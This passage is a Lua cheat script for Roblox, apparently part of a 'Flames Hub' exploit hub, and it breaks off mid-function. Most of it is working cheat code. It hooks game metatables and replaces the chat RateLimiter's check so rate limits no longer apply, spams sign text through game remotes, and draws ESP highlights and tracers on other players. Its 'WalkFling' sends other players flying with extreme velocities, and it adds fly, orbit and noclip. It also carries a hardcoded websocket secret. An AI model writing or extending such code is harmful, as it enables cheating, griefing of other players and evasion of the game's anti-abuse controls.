            if spectateTarget ~= targetPlayer or not character then return end

            local hum = getPlrHum(character) or getHum(character, 5)
            local subj = hum or getRoot(character)
            if not subj then return end

            spectateSubject = subj
            originalIO.ensureCam()
            originalIO.hookCameraGuard()
         end

         setCamToCharacter(targetPlayer.Character)

         spectateConns.char = getgenv().FlamesLibrary.connect("spectate_char", targetPlayer.CharacterAdded:Connect(function(character)
            if spectateTarget ~= targetPlayer then return end
            setCamToCharacter(character)
         end))

         spectateConns.leave = NAlib.connect("spectate_leave", Players.PlayerRemoving:Connect(function(player)
            if player == targetPlayer and spectateTarget == targetPlayer then
               cleanup(true)
               DebugNotif("Player left - camera reset")
            end
         end))

         spectateConns.loop = NAlib.connect("spectate_loop", RunService.RenderStepped:Connect(function()
            if spectateTarget ~= targetPlayer then return end

            local char = targetPlayer.Character
            if not char or not char.Parent then return end

            if not spectateSubject or spectateSubject.Parent ~= char then
               setCamToCharacter(char)
            else
               originalIO.ensureCam()
            end
         end))
      end

      spectatePlayer(plr)
   end

   print("Stop Rainbow Skin Function init.")

   getgenv().initCooldownHandler = function()
      local CooldownTime = 5
      local Chat = Enum.CoreGuiType.Chat

      getgenv().CooldownActive = getgenv().CooldownActive or false
      getgenv().HashtagCount = getgenv().HashtagCount or 0

      local function startCooldown(duration)
         if getgenv().CooldownActive then
            return notify("Warning", "Your TextChat cooldown is still currently active.", 6)
         end
         getgenv().CooldownActive = true
         notify("Info", "Cooldown started for: " .. duration .. "s.", 8)

         task.delay(duration, function()
            getgenv().CooldownActive = false
            getgenv().HashtagCount = 0
            pcall(function()
               StarterGui:SetCoreGuiEnabled(Chat, true)
            end)
            notify("Success", "Chat re-enabled, cooldown ended.", 7)
         end)
      end

      local function cooldownListener(sender, msg)
         if sender ~= Players.LocalPlayer then return end
         local text = msg.Text
         if text and text:match("^#+$") then
            getgenv().HashtagCount = (getgenv().HashtagCount or 0) + 1
            if getgenv().HashtagCount >= 4 then
               pcall(function()
                  StarterGui:SetCoreGuiEnabled(Chat, false)
               end)
               startCooldown(CooldownTime)
               notify("Warning", "Too many filtered messages, chat disabled temporarily (10 seconds).", 10)
            end
         end
      end

      table.insert(getgenv().ChatMessageHooks, cooldownListener)
   end

   if getgenv().ChatMetaMethodHookApplied then
      initCooldownHandler()
   else
      notify("Info", "Skipping cooldown handler — hook not applied.", 3)
   end

   print("cooldown handler is good.")

   local View_Outfit_State_Toggle = getgenv().LocalPlayer:GetAttribute("hide_view_outfit") or true
   fw(0.2)
   local function push_stealer_state(state)
      getgenv().ws_main_reactor_connector:Send(HttpService:JSONEncode{
         type = "anti_stealer_state",
         secret = "flames_hub_2026",
         user = tostring(getgenv().LocalPlayer.Name),
         state = state
      })
   end

   getgenv().anti_outfit_copier = function(toggle)
      if toggle == true then
         if getgenv().anti_outfit_stealer then
            return notify("Error", "Anti Outfit Stealer is already enabled!", 5)
         end
         if getgenv().AntiFitStealerConn then
            return notify("Error", "Anti Outfit Stealer is already enabled! [connection]", 5)
         end

         notify("Success", "Flames Hub | Anti Outfit Stealer is now active.", 7)

         local lib = getgenv().FlamesLibrary
         getgenv().AntiFitStealerConn = nil
         getgenv().ToggleAntiFit_Stealer = function(state)
            if not state then
               getgenv().anti_outfit_stealer = false
               if getgenv().AntiFitStealerConn then
                  getgenv().AntiFitStealerConn:Disconnect()
                  getgenv().AntiFitStealerConn = nil
               end

               local hide_outfit_toggle = getgenv().LocalPlayer:GetAttribute("hide_view_outfit")
               if hide_outfit_toggle and hide_outfit_toggle == false then
                  getgenv().Send("hide_view_outfit", true)
                  notify("Success", "hide_view_outfit setting changed, reverted change (keep it on).", 3)
               end

               push_stealer_state(false)
               return
            else
               getgenv().anti_outfit_stealer = true
               push_stealer_state(true)
            end

            getgenv().AntiFitStealerConn = getgenv().RunService.Heartbeat:Connect(function()
               lib.wait(0.4)
               local hide_outfit_toggle = getgenv().LocalPlayer:GetAttribute("hide_view_outfit")

               if hide_outfit_toggle and hide_outfit_toggle == false then
                  getgenv().Send("hide_view_outfit", true)
                  notify("Success", "hide_view_outfit setting changed, reverted change (keep it on).", 3)
               end
            end)
         end

         fw(0.1)
         getgenv().ToggleAntiFit_Stealer(true)
      elseif toggle == false then
         if not getgenv().anti_outfit_stealer then
            return notify("Error", "Anti Outfit Copier is not enabled!", 5)
         end

         getgenv().anti_outfit_stealer = false
         if getgenv().AntiFitStealerConn then
            getgenv().AntiFitStealerConn:Disconnect()
            getgenv().AntiFitStealerConn = nil
         end

         getgenv().ToggleAntiFit_Stealer(false)
         notify("Success", "Disabled Anti Outfit Stealer.", 5)
      else
         return
      end
   end

   print("anti outfit stealer is good.")
   local upvalues_func_main = getupvalue or getupvalues or debug.getupvalues
   local get_proto_func = getproto or debug.getproto or getprotos
   getgenv().hook_meta_main = getgenv().hook_meta_main or function(obj, metamethod, func)
      if not getrawmetatable then return end
      local old = getrawmetatable and getrawmetatable(obj)

      if hookfunction then
         return hookfunction(old[metamethod],func)
      else
         local oldmetamethod = old[metamethod]
         if makewriteable then
            makewriteable(old)
         end
         old[metamethod] = func
         if makereadonly then
            makereadonly(old)
         end
         return oldmetamethod
      end
   end

   getgenv().find_messages_modulescript = function()
      if getgenv().Messages_Module_Found_Loc then
         return getgenv().Messages_Module_Found_Loc
      end

      local reps = getgenv().ReplicatedStorage or safe_wrapper("ReplicatedStorage")
      if not reps then return nil end
      local found = reps:FindFirstChild("Messages", true)
      if found and found:IsA("ModuleScript") then
         getgenv().Messages_Module_Found_Loc = found
      end

      return getgenv().Messages_Module_Found_Loc
   end

   getgenv().find_UI_modulescript = function()
      if getgenv().UI_Module_Main then
         return getgenv().UI_Module_Main
      end

      local reps = getgenv().ReplicatedStorage or safe_wrapper("ReplicatedStorage")
      if not reps then return nil end

      local found = reps:FindFirstChild("UI", true)
      if found and found:IsA("ModuleScript") then
         getgenv().UI_Module_Main = found
      end

      return getgenv().UI_Module_Main
   end

   getgenv().find_RateLimiter_modulescript = function()
      if getgenv().RateLimiter_Module_Main then
         return getgenv().RateLimiter_Module_Main
      end

      local reps = getgenv().ReplicatedStorage or safe_wrapper("ReplicatedStorage")
      if not reps then return nil end

      local found = reps:FindFirstChild("RateLimiter", true)
      if found and found:IsA("ModuleScript") then
         getgenv().RateLimiter_Module_Main = found
      end

      return getgenv().RateLimiter_Module_Main
   end

   if not getgenv().RateLimiter_Bypass_Applied then
      if get_proto_func and upvalues_func_main and require then
         local ok, err = pcall(function()
            local message_module = getgenv().Messages_Module_Found_Loc
               and require(getgenv().Messages_Module_Found_Loc)
               or require(find_messages_modulescript())
            local rate_limiter = upvalues_func_main(get_proto_func(message_module.loaded, 4, true)[1], 5)
            if typeof(rate_limiter) == "table" and rate_limiter.is_limited then
               rate_limiter.is_limited = function() return false end
               getgenv().RateLimiter_Bypass_Applied = true
               getgenv().RateLimiter_Bypass_Applied_Method_2 = true
            end
         end)
         if not ok then
            warn("RateLimiter bypass method failed unexpectedly.")
         end
      end
   end

   print("ratelimit bypass applied.")

   getgenv().spam_sign_text = function(toggle)
      local Character = getgenv().Character
      local PlacedModels = Workspace:WaitForChild("PlacedModels")
      local random_words = {
         "yo","wsg bro","aye","lit","fire"
      }

      local function find_tool_partial(toolName)
         if not toolName then return nil end
         local query = toolName:lower()

         for _, v in ipairs(PlacedModels:GetChildren()) do
            if v:IsA("Model") and v.Name:lower() == query then
               local ownerAttr = v:GetAttribute("owner_id")
               if ownerAttr and tostring(ownerAttr) == tostring(LocalPlayer.UserId) then
                  return v
               end
            end
         end

         for _, v in ipairs(Character:GetChildren()) do
            if v.Name:lower() == query then
               return v
            end
         end

         return nil
      end

      if toggle == true then
         if getgenv().ToolChanger_FE then return notify("Warning", "Sign Spammer is already enabled!", 5) end
         getgenv().ToolChanger_FE = true

         getgenv().Sign_ChangeText_Fast_Loop_Task = task.spawn(function()
            while getgenv().ToolChanger_FE == true do
               local tool = find_tool_partial("sign")
               if not tool then
                  getgenv().Send("get_tool", "Sign")
                  fw(0.1)
               else
                  for _, word in ipairs(random_words) do
                     if not getgenv().ToolChanger_FE then break end
                     getgenv().Send("change_sign", tool, tostring(word))
                     fw(0)
                  end
               end
               fw(0.1)
            end
         end)
      elseif toggle == false then
         if getgenv().Sign_ChangeText_Fast_Loop_Task then
            task.cancel(getgenv().Sign_ChangeText_Fast_Loop_Task)
            getgenv().Sign_ChangeText_Fast_Loop_Task = nil
         end
         getgenv().ToolChanger_FE = false
      else
         return 
      end
   end

   if not getgenv().player_esp_core then
      getgenv().player_esp_core = true
      local players = getgenv().Players or game:GetService("Players")
      local localplayer = getgenv().LocalPlayer or players.LocalPlayer
      local esp_objects = {}
      local connections = {}
      getgenv().Flames_Hub_Player_ESP_Core_Has_Been_Enabled = false

      local function wait_character(plr)
         local character = plr.Character
         while getgenv().Flames_Hub_Player_ESP_Core_Has_Been_Enabled and plr.Parent and (not character or not character.Parent) do
            character = plr.Character
            getgenv().heartbeat_wait_function(6)
         end
         return character
      end

      local function remove_esp(plr)
         if esp_objects[plr] then
            esp_objects[plr]:Destroy()
            esp_objects[plr] = nil
         end
      end

      local function apply_esp(plr)
         if not getgenv().Flames_Hub_Player_ESP_Core_Has_Been_Enabled then return end
         if plr == localplayer then return end
         task.spawn(function()
            local character = wait_character(plr)
            if not getgenv().Flames_Hub_Player_ESP_Core_Has_Been_Enabled or not character then return end
            remove_esp(plr)
            local highlight = Instance.new("Highlight")
            highlight.FillTransparency = 0.5
            highlight.OutlineTransparency = 0
            highlight.Adornee = character
            highlight.Parent = character
            esp_objects[plr] = highlight
         end)
      end

      local function track_player(plr)
         apply_esp(plr)
         connections[plr] = plr.CharacterAdded:Connect(function(new_char)
            if plr == localplayer then return end
            while getgenv().Flames_Hub_Player_ESP_Core_Has_Been_Enabled and new_char and not new_char.Parent do
               getgenv().heartbeat_wait_function(6)
            end
            apply_esp(plr)
         end)
      end

      local function untrack_player(plr)
         remove_esp(plr)
         if connections[plr] then
            connections[plr]:Disconnect()
            connections[plr] = nil
         end
      end

      getgenv().enable_player_esp = function()
         if getgenv().Flames_Hub_Player_ESP_Core_Has_Been_Enabled then
            return getgenv().notify("Warning", "Flames Hub Player ESP is already enabled.", 5)
         end
         getgenv().Flames_Hub_Player_ESP_Core_Has_Been_Enabled = true
         for _, plr in ipairs(players:GetPlayers()) do
            track_player(plr)
         end
         connections.player_added = players.PlayerAdded:Connect(track_player)
         connections.player_removed = players.PlayerRemoving:Connect(untrack_player)
      end

      getgenv().disable_player_esp = function()
         if not getgenv().Flames_Hub_Player_ESP_Core_Has_Been_Enabled then
            return getgenv().notify("Warning", "Flames Hub Player ESP is not enabled.", 6)
         end
         getgenv().Flames_Hub_Player_ESP_Core_Has_Been_Enabled = false
         for plr in pairs(esp_objects) do
            remove_esp(plr)
         end
         for _, conn in pairs(connections) do
            if typeof(conn) == "RBXScriptConnection" then
               conn:Disconnect()
            end
         end
         table.clear(connections)
      end
   end

   if Drawing and not getgenv().tracer_core_initialized then
      getgenv().tracer_core_initialized = true

      local players = getgenv().Players or game:GetService("Players")
      local runservice = getgenv().RunService or game:GetService("RunService")
      local camera = workspace.CurrentCamera
      local localplayer = getgenv().LocalPlayer or getgenv().Players.LocalPlayer or players.LocalPlayer
      local tracer_objects = {}
      getgenv().tracer_main_esp_connections = {}
      getgenv().tracer_esp_currently_running_flag_Flames_Hub = false
      if getgenv().disable_tracers and typeof(getgenv().disable_tracers) == "function" then
         pcall(function() getgenv().disable_tracers() end)
      end
      local function remove_tracer(plr)
         if tracer_objects[plr] then
            tracer_objects[plr]:Remove()
            tracer_objects[plr] = nil
         end
      end

      local function create_tracer(plr)
         if plr == localplayer then return end
         while getgenv().tracer_esp_currently_running_flag_Flames_Hub and not plr.Parent do
            if getgenv().disable_tracers and typeof(getgenv().disable_tracers) == "function" then
               pcall(function() getgenv().disable_tracers() end)
            end
         end
         if not getgenv().tracer_esp_currently_running_flag_Flames_Hub then  end
         local line = Drawing.new("Line")
         line.Thickness = 1
         line.Transparency = 1
         line.Visible = false
         tracer_objects[plr] = line
      end

      local function update_tracers()
         if not getgenv().tracer_esp_currently_running_flag_Flames_Hub then
            pcall(function() getgenv().disable_tracers() end)
            return 
         end
         local view = camera.ViewportSize
         for plr, line in pairs(tracer_objects) do
            local character = plr.Character or get_char(plr, 1)
            local root = character and character:FindFirstChild("HumanoidRootPart")
            if root then
               local pos, onscreen = camera:WorldToViewportPoint(root.Position)
               if onscreen then
                  line.Visible = true
                  line.From = Vector2.new(view.X / 2, view.Y)
                  line.To = Vector2.new(pos.X, pos.Y)
               else
                  line.Visible = false
               end
            else
               line.Visible = false
            end
         end
      end

      getgenv().enable_tracers = function()
         if getgenv().tracer_esp_currently_running_flag_Flames_Hub then
            return getgenv().notify("Warning", "Tracer ESP is already enabled!", 5)
         end
         getgenv().tracer_esp_currently_running_flag_Flames_Hub = true
         for _, plr in ipairs(players:GetPlayers()) do
            create_tracer(plr)
         end
         getgenv().tracer_main_esp_connections.render = runservice.RenderStepped:Connect(update_tracers)
         getgenv().tracer_main_esp_connections.player_added = players.PlayerAdded:Connect(create_tracer)
         getgenv().tracer_main_esp_connections.player_removed = players.PlayerRemoving:Connect(remove_tracer)
      end

      getgenv().disable_tracers = function()
         if not getgenv().tracer_esp_currently_running_flag_Flames_Hub then
            return getgenv().notify("Warning", "Tracer ESP is not enabled!", 5)
         end
         getgenv().tracer_esp_currently_running_flag_Flames_Hub = false
         for plr in pairs(tracer_objects) do
            remove_tracer(plr)
         end
         for _, conn in pairs(getgenv().tracer_main_esp_connections) do
            if typeof(conn) == "RBXScriptConnection" then
               conn:Disconnect()
            end
         end
         table.clear(getgenv().tracer_main_esp_connections)
      end
   end

   wait(0.3)
   if getgenv().RateLimiter_Bypass_Applied then
      if getgenv().RateLimiter_Bypass_Applied_Method_1 then
         notify("Success", "RateLimiter bypass applied with method 1.", 10)
      elseif getgenv().RateLimiter_Bypass_Applied_Method_2 then
         notify("Success", "RateLimiter bypass applied with method 2.", 10)
      elseif getgenv().RateLimiter_Bypass_Applied_Method_3 then
         notify("Success", "RateLimiter bypass applied with method 3.", 10)
      else
         notify("Warning", "We we're unable to apply any RateLimiter bypass.", 10)
      end
   else
      notify("Warning", "Not sure if RateLimiter bypass was applied or not.")
   end

   getgenv().WalkFlingWhitelist = getgenv().WalkFlingWhitelist or {}
   getgenv().walkflinging = getgenv().walkflinging or false
   getgenv().WalkFlingConnections = getgenv().WalkFlingConnections or {}
   getgenv().AddToWalkFlingWhitelist = function(user)
      local userid = ToUserId(user)
      if not userid then
         return notify("Warning","That player is invalid or has left the game.",5)
      end
      if getgenv().WalkFlingWhitelist[userid] then
         return notify("Warning","That player is already in the WalkFling Whitelist.",5)
      end
      getgenv().WalkFlingWhitelist[userid] = true
      return notify("Success","Added to WalkFling Whitelist.",5)
   end

   getgenv().RemoveFromWalkFlingWhitelist = function(user)
      local userid = ToUserId(user)
      if not userid then
         return notify("Warning", "That player is invalid or has left the game.", 5)
      end
      if not getgenv().WalkFlingWhitelist[userid] then
         return notify("Warning", "That player is not in the WalkFling Whitelist.", 5)
      end
      getgenv().WalkFlingWhitelist[userid] = nil
      return notify("Success", "Removed from WalkFling Whitelist.", 5)
   end

   getgenv().is_whitelisted = function(plr)
      if not plr then return false end
      return getgenv().WalkFlingWhitelist[plr.UserId] == true
   end

   getgenv().stop_walkfling = function()
      if not getgenv().walkflinging then
         return notify("Error", "WalkFling-V3 is not enabled.", 5)
      end

      getgenv().walkflinging = false
      getgenv().FlamesLibrary.disconnect("walkflinger")

      for _, conn in pairs(getgenv().WalkFlingConnections) do
         conn:Disconnect()
      end
      getgenv().WalkFlingConnections = {}

      if getgenv().WalkFlingRespawnConn then
         getgenv().WalkFlingRespawnConn:Disconnect()
         getgenv().WalkFlingRespawnConn = nil
      end

      if getgenv().Noclip_Enabled then
         getgenv().Toggleable_Noclip(false)
      end

      local root = getgenv().HumanoidRootPart
      if root then
         root.Velocity = Vector3.zero
      end

      local hum = getgenv().Humanoid or get_human(LocalPlayer or game.Players.LocalPlayer) or getgenv().Character:FindFirstChildOfClass("Humanoid")
      if hum then
         hum.PlatformStand = false
         hum:ChangeState(Enum.HumanoidStateType.GettingUp)
      end

      notify("Success", "WalkFling-V3 has been stopped/disabled.", 5)
   end

   getgenv().start_walkfling = function()
      if getgenv().walkflinging then
         return notify("Warning", "WalkFling-V3 is already enabled!", 5)
      end

      getgenv().walkflinging = true

      if not getgenv().Noclip_Enabled then getgenv().Toggleable_Noclip(true) end

      getgenv().notify("Success", "WalkFling-V3 is now enabled.", 5)

      local lp = getgenv().LocalPlayer or Players.LocalPlayer
      local function connect_touch_fling(character)
         for _, conn in pairs(getgenv().WalkFlingConnections) do
            conn:Disconnect()
         end
         getgenv().WalkFlingConnections = {}

         for _, part in ipairs(character:GetChildren()) do
            if part:IsA("BasePart") then
               local conn = part.Touched:Connect(function(hit)
                  if not getgenv().walkflinging then return end

                  local hit_char = hit.Parent
                  local hit_player = Players:GetPlayerFromCharacter(hit_char)

                  if not hit_player then return end
                  if hit_player == lp then return end
                  if getgenv().is_whitelisted(hit_player) then return end

                  local hit_root = hit_char:FindFirstChild("HumanoidRootPart")
                  if not hit_root then return end

                  local velocity_power = 3500
                  local root = getgenv().HumanoidRootPart
                  local v = root and root.Velocity or Vector3.zero

                  hit_root.Velocity = v * velocity_power + Vector3.new(0, velocity_power, 0)
               end)
               table.insert(getgenv().WalkFlingConnections, conn)
            end
         end
      end

      local char = getgenv().Character or get_char(lp, 10)
      if char then
         connect_touch_fling(char)
      end

      getgenv().WalkFlingRespawnConn = lp.CharacterAdded:Connect(function(new_char)
         if getgenv().walkflinging then
            connect_touch_fling(new_char)
         end
      end)

      getgenv().FlamesLibrary.disconnect("walkflinger")
      getgenv().FlamesLibrary.connect("walkflinger", RunService.Heartbeat:Connect(function()
         if not getgenv().walkflinging then return end

         local velocity_power = 3500
         local character = getgenv().Character or get_char(lp, 10)
         local root = getgenv().HumanoidRootPart or (character and character:FindFirstChild("HumanoidRootPart") or get_root(lp, 10))
         if not root then return end

         local v = root.Velocity
         root.Velocity = v * velocity_power + Vector3.new(0, velocity_power, 0)
         RunService.RenderStepped:Wait()
         if root then
            root.Velocity = v
         end
         RunService.RenderStepped:Wait()
         if root then
            root.Velocity = v + Vector3.new(0, 0.1, 0)
         end
      end))
   end

   getgenv().StartWalkFling = getgenv().start_walkfling
   getgenv().StopWalkFling = getgenv().stop_walkfling
   print("start walkfling local function is good.")
   getgenv().getcharsize = function()
      local hum = getgenv().Humanoid
      if not hum then return 5,2 end
      local d = hum:GetAppliedDescription()
      local h = 5 * (d.HeightScale or 1)
      local w = 2 * (d.WidthScale or 1)
      return h,w
   end

   getgenv().autospinspeed = function(base)
      local h,w = getcharsize()
      return base / h
   end

   getgenv().change_spin_speed = function(speed)
      if typeof(speed) ~= "number" then
         if speed then
            return notify("Error", tostring(speed).." isn't a number! Input a number.", 5)
         else
            return notify("Error", "That wasn't a number! Input a number.", 5)
         end
      end
      if getgenv().walkflinging then
         return notify("Error", "Turn off walkfling first for this to work properly.", 10)
      end

      for _, v in ipairs(getgenv().HumanoidRootPart:GetChildren()) do
         if v.Name == "FlamesHub_Spin" then
            v.AngularVelocity = Vector3.new(0, speed, 0)
            notify("Success", "New spin speed: "..tostring(speed), 5)
         end
      end
   end

   getgenv().LockHouse_LastState = getgenv().LockHouse_LastState or {}
   getgenv().LockHomeLoop = getgenv().LockHomeLoop or false
   print("lock home loop getgenv() is good.")
   getgenv().get_plot_of_player = function(player)
      if not player then 
         return nil, "No player provided" 
      end

      local plotList = PlotMarker and PlotMarker.class and PlotMarker.class.objects
      if type(plotList) ~= "table" then
         return nil, "Plots not available"
      end

      for _, plot in pairs(plotList) do
         if plot 
         and plot.states 
         and plot.states.owner
         and typeof(plot.states.owner.get) == "function"
         and plot.instance
         then
            local ok, owner = pcall(function()
               return plot.states.owner.get()
            end)

            if ok and owner == player then
               return plot.instance, plot
            end
         end
      end

      return nil, "Player has no plot"
   end

   print("get plot of plr is good.")

   getgenv().toggle_house_lock = function(player)
      local plotInstance = select(1, get_plot_of_player(player))
      if not plotInstance then return end

      getgenv().Send("lock_home", plotInstance)
   end

   print("toggle house lock is good.")

   getgenv().is_home_locked = function(player)
      local plotInstance, plotObject = get_plot_of_player(player)
      if not plotObject then
         return nil, "Player has no plot"
      end

      if not plotObject.states 
      or not plotObject.states.locked 
      or typeof(plotObject.states.locked.get) ~= "function"
      then
         return nil, "Locked state unavailable"
      end

      local ok, locked = pcall(function()
         return plotObject.states.locked.get()
      end)

      if not ok then
         return nil, "Failed to read lock state"
      end

      return locked
   end

   print("is home locked function is good.")

   getgenv().LockHouse_LastState = getgenv().LockHouse_LastState or {}
   getgenv().LockHomeLoop = getgenv().LockHomeLoop or false
   getgenv().LockHomeToken = getgenv().LockHomeToken or 0
   getgenv().keep_home_locked = function(toggle)
      if toggle then
         if getgenv().LockHomeLoop then
            return notify("Warning", "Lock Home loop is already enabled.", 5)
         end

         getgenv().LockHomeLoop = true
         getgenv().LockHomeToken = (getgenv().LockHomeToken or 0) + 1
         local myToken = getgenv().LockHomeToken

         notify("Success", "Lock Home loop is now enabled.", 5)

         task.spawn(function()
            while getgenv().LockHomeLoop and myToken == getgenv().LockHomeToken do
               fw(0.2)

               local plotList = PlotMarker and PlotMarker.class and PlotMarker.class.objects
               if plotList then
                  for _, plot in pairs(plotList) do
                     if myToken ~= getgenv().LockHomeToken then
                        return
                     end

                     local okOwner, owner = pcall(function()
                        return plot.states.owner.get()
                     end)

                     if okOwner and owner == getgenv().LocalPlayer then
                        local id = plot.instance:GetDebugId()

                        if getgenv().LockHouse_LastState[id] == nil then
                           getgenv().LockHouse_LastState[id] = plot.states.locked.get()
                        end

                        local locked = plot.states.locked.get()
                        local last = getgenv().LockHouse_LastState[id]

                        if locked == false and last == true then
                           toggle_house_lock(getgenv().LocalPlayer)
                           getgenv().LockHouse_LastState[id] = true
                        else
                           getgenv().LockHouse_LastState[id] = locked
                        end
                     end
                  end
               end
            end
         end)
      else
         if not getgenv().LockHomeLoop then
            return notify("Warning", "Lock Home loop is not enabled.", 5)
         end

         getgenv().LockHomeLoop = false
         getgenv().LockHomeToken = (getgenv().LockHomeToken or 0) + 1
         table.clear(getgenv().LockHouse_LastState)

         notify("Success", "Lock Home loop is now disabled.", 5)
      end
   end

   print("keep home locked is good.")

   getgenv().spin_plr = function(toggle, speed)
      local hrp = getgenv().HumanoidRootPart or get_root(getgenv().LocalPlayer)

      if toggle == true then
         if getgenv().already_spinning_localplr then
            return notify("Warning", "You are already spinning, changing speed.", 5)
         end
         if typeof(speed) ~= "number" then
            return notify("Error", "That wasn't a number! Input a number.", 5)
         end
         if getgenv().walkflinging then
            return notify("Error", "Turn off walkfling first for this to work properly.", 10)
         end

         getgenv().already_spinning_localplr = true
         for _, v in pairs(hrp:GetChildren()) do
            if v.Name == "FlamesHub_Spin" then
               v:Destroy()
            end
         end
         wait(.1)
         local Spin = Instance.new("BodyAngularVelocity")
         Spin.Name = "FlamesHub_Spin"
         Spin.MaxTorque = Vector3.new(0, math.huge, 0)
         Spin.AngularVelocity = Vector3.new(0, autospinspeed(speed), 0)
         Spin.Parent = hrp
      elseif toggle == false then
         if not getgenv().already_spinning_localplr then
            return notify("Error", "You are not using Spin.", 5)
         end

         for _, v in ipairs(hrp:GetChildren()) do
            if v:IsA("BodyAngularVelocity") and v.Name == "FlamesHub_Spin" then
               v:Destroy()
            end
         end
         getgenv().already_spinning_localplr = false
      else
         return
      end
   end

   print("spin plr toggle func is good.")

   getgenv().OrbitConnections = getgenv().OrbitConnections or {}
   getgenv().Is_Orbiting = getgenv().Is_Orbiting or false
   getgenv().OrbitSpeed = getgenv().OrbitSpeed or 1

   print("orbit getgenv() conns and values are good.")

   getgenv().set_orbit_speed = function(new_speed)
      if type(new_speed) == "number" then
         getgenv().OrbitSpeed = new_speed
         notify("Info", "Orbit speed set to " .. tostring(new_speed), 4)
      else
         notify("Error", "Invalid speed value.", 4)
      end
   end

   print("set orbit speed is good.")

   getgenv().stop_orbit = function()
      if not getgenv().Is_Orbiting then
         return notify("Warning", "You're not orbiting anyone.", 5)
      end
      for _, conn in pairs(getgenv().OrbitConnections) do
         if typeof(conn) == "RBXScriptConnection" then
            conn:Disconnect()
         end
      end
      table.clear(getgenv().OrbitConnections)
      getgenv().Is_Orbiting = false
      notify("Success", "Stopped orbiting Player.", 4)
   end

   print("stop orbit func is good.")

   getgenv().start_orbit_plr = function(target, speed, distance)
      if getgenv().Is_Orbiting then
         return notify("Warning", "Already orbiting someone!", 5)
      end
      if not target or not target.Character then
         return notify("Error", "Target invalid or they're missing their Character.", 5)
      end

      local RunService = getgenv().RunService or cloneref and cloneref(game:GetService("RunService")) or game:GetService("RunService")
      local target_char = target.Character or getgenv().get_char(target)
      local root = getgenv().HumanoidRootPart or get_root(LocalPlayer)
      local humanoid = getgenv().Humanoid or get_human(LocalPlayer) or getgenv().Character:FindFirstChildOfClass("Humanoid")
      local targetRoot = target_char:FindFirstChild("HumanoidRootPart") or get_root(target)
      if not root or not humanoid or not targetRoot then
         getgenv().Is_Orbiting = false
         return notify("Error", "Missing root or humanoid, cannot orbit this player.", 5)
      end

      speed = tonumber(speed) or getgenv().OrbitSpeed or 1
      distance = tonumber(distance) or 3
      getgenv().OrbitSpeed = speed
      getgenv().Is_Orbiting = true

      local rotation = 0

      getgenv().OrbitConnections.Heartbeat = RunService.Heartbeat:Connect(function()
         pcall(function()
            if not getgenv().Is_Orbiting or not target_char or not targetRoot or not root then
               return 
            end
            rotation = rotation + (getgenv().OrbitSpeed or 0)
            root.CFrame = CFrame.new(targetRoot.Position) * CFrame.Angles(0, math.rad(rotation), 0) * CFrame.new(distance, 0, 0)
         end)
      end)

      getgenv().OrbitConnections.RenderStepped = RunService.RenderStepped:Connect(function()
         pcall(function()
            if root and targetRoot then
               root.CFrame = CFrame.new(root.Position, targetRoot.Position)
            end
         end)
      end)

      getgenv().OrbitConnections.Died = humanoid.Died:Connect(stop_orbit)
      getgenv().OrbitConnections.Seated = humanoid.Seated:Connect(function(isSeated)
         if isSeated then stop_orbit() end
      end)

      notify("Success", "Started orbiting: "..tostring(target)..", with speed: "..tostring(speed)..", and with distance: "..tostring(distance), 5)
   end

   print("start orbit plr func is good.")

   getgenv().water_skie_trailer = function(Bool, Vehicle)
      if not Vehicle then
         return notify("Warning", "You do not have a Vehicle spawned!", 5)
      end

      local HasTrailer = Vehicle:FindFirstChild("WaterSkies")

      if Bool == true then
         if HasTrailer then
            return notify("Error", "You already have the WaterSkies trailer.", 5)
         else
            getgenv().Get("add_trailer", Vehicle, "WaterSkies")
         end
      elseif Bool == false then
         if HasTrailer then
            getgenv().Get("add_trailer", Vehicle, "WaterSkies")
         else
            return notify("Warning", "You do not have the WaterSkies trailer to take it off!", 5)
         end
      else
         return notify("Error", "Invalid toggle value (expected: true/false).", 5)
      end
   end

   print("water skies function good")

   getgenv().FlyEnabled = getgenv().FlyEnabled or false
   getgenv().FlySpeed = getgenv().FlySpeed or 1
   getgenv().QEfly = (getgenv().QEfly == nil) and true or getgenv().QEfly
   getgenv().flyKeyDown = getgenv().flyKeyDown or nil
   getgenv().flyKeyUp = getgenv().flyKeyUp or nil
   getgenv().mobileFlyConn = getgenv().mobileFlyConn or nil
   getgenv().pcFlyConn = getgenv().pcFlyConn or nil
   local UIS = getgenv().UserInputService
   local RunService = getgenv().RunService

   print("checked global environment flying stuff.")

   getgenv().EnableFly = function(state, speed, vfly)
      if getgenv().FlyEnabled then
         if speed and tonumber(speed) then
            getgenv().FlySpeed = tonumber(speed)
            return notify("Success", "Fly speed updated to: " .. tostring(getgenv().FlySpeed), 4)
         end
         return notify("Warning", "Fly is already enabled! Provide a speed to update it.", 5)
      end

      local plr = getgenv().LocalPlayer or getgenv().Players.LocalPlayer or game.Players.LocalPlayer
      local char = getgenv().get_char(plr) or getgenv().Character or plr.Character
      local hrp = getgenv().HumanoidRootPart or char:FindFirstChild("HumanoidRootPart") or get_root(plr)
      local hum = getgenv().Humanoid or char:FindFirstChildOfClass("Humanoid") or get_human(plr)
      local cam = workspace.CurrentCamera

      if not hrp or not hum then
         return getgenv().notify("Error", "Character is not ready or Humanoid doesn't exist.", 6)
      end

      if not state then
         DisableFly()
         return
      end

      if speed and tonumber(speed) then
         getgenv().FlySpeed = tonumber(speed)
      end

      getgenv().FlyEnabled = true

      if getgenv().flyKeyDown then getgenv().flyKeyDown:Disconnect() getgenv().flyKeyDown = nil end
      if getgenv().flyKeyUp then getgenv().flyKeyUp:Disconnect() getgenv().flyKeyUp = nil end
      if getgenv().pcFlyConn then getgenv().pcFlyConn:Disconnect() getgenv().pcFlyConn = nil end
      if getgenv().mobileFlyConn then getgenv().mobileFlyConn:Disconnect() getgenv().mobileFlyConn = nil end
      if hrp:FindFirstChild("FlyGyro") then hrp.FlyGyro:Destroy() end
      if hrp:FindFirstChild("FlyVelocity") then hrp.FlyVelocity:Destroy() end

      local BG = Instance.new("BodyGyro")
      BG.P = 9e4
      BG.MaxTorque = Vector3.new(9e9,9e9,9e9)
      BG.CFrame = hrp.CFrame
      BG.Name = "FlyGyro"
      BG.Parent = hrp

      local BV = Instance.new("BodyVelocity")
      BV.MaxForce = Vector3.new(9e9,9e9,9e9)
      BV.Velocity = Vector3.zero
      BV.Name = "FlyVelocity"
      BV.Parent = hrp

      hum.PlatformStand = true

      if not isMobile then
         local CONTROL = {F=0,B=0,L=0,R=0,Q=0,E=0}

         getgenv().pcFlyConn = RunService.RenderStepped:Connect(function(dt)
            if not getgenv().FlyEnabled then return end
            if not cam or not hrp or not hum then return end

